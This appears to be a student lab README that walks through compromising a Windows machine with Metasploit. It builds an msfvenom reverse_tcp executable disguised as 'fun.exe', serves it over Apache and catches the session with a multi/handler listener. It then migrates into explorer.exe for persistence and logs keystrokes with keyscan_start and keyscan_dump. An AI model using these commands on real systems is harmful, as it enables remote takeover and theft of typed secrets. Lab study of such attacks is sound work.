# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
## PROGRAM:

Find the attackers ip address using ifconfig

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/74550efa-b854-40d4-b2ea-efcca695c3a8)

Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/d7fa5d5a-2d2e-4353-91c0-a264ffd766d5)

copy the fun.exe into the apache /var/www/html folder

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/64f9ee47-fe20-476d-8b2f-cbecfb0d9b10)

Start apache server
sudo systemctl apache2 start

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/9de7872b-0606-4bc4-b61b-764fd8f69354)

Check the status of apache2

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/98a71193-fe0b-4b71-8135-5832349c2c8b)

## Invoke msfconsole:

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/c68b088d-f9ac-494e-89b3-7619dc9a0d1a)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/5bd905e1-0784-45cd-85bd-5d4fd6c26187)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/38c8fc01-5d18-453e-bfa3-f891427a73ec)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/7ba4fa62-e21e-4f75-a4fc-76f0c60f88bd)

Bypass any warning boxes, double-click the file, and allow it to run.

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/ca529d8a-3722-4ec3-b0ba-f9e09b5d0aa4)

On kali give the command exploit

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/7cd5e8ca-50f0-4759-8f28-cc6ff0527039)

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/5aa4b149-d48c-46c6-b76f-24de7f2a1987)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/8c13a53a-f912-46fd-8128-f5b7c33fcb09)

## Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/2a10708c-b57d-4186-b5d9-11430a205c3e)
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/2bcd0bf4-82ea-4c20-ba04-90ba4eb23340)

keyscan_dump	Shows the keystrokes captured so far

## OUTPUT:
![image](https://github.com/AmirthaRoopaS/Compromising-windows-using-Metasploit/assets/143496311/404437cd-6710-4752-ac8e-6a859528baad)

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.

